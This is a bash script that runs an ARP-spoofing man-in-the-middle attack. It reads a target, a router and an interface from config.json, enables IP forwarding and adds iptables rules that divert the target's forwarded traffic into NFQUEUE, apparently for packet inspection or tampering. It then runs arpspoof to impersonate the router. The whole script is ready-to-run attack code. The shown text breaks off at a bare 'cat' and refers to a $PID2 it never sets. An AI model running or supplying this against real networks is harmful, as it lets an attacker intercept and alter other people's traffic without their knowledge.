#!/bin/bash

if [[ $EUID -ne 0 ]]; then
  echo "Please run as root"
  exit 1
fi

target=$(jq -r '.target' config.json)
router=$(jq -r '.router' config.json)
attacker=$(jq -r '.attacker' config.json)
interface=$(jq -r '.interface' config.json)

echo "" > log

trap 'end' INT

function end() {
  kill $PID1
  kill $PID2
  iptables -F
  echo "Shutdon now..."
  wait $PID1
}

echo 1 > /proc/sys/net/ipv4/ip_forward

sudo iptables -A FORWARD -d $target -j NFQUEUE --queue-num 0
sudo iptables -A FORWARD -s $target -j NFQUEUE --queue-num 0

# Using arpspoof command to acting as a router
sudo arpspoof -i $interface -t $target -r $router > arpspoof.log 2>&1 &
PID1=$!

cat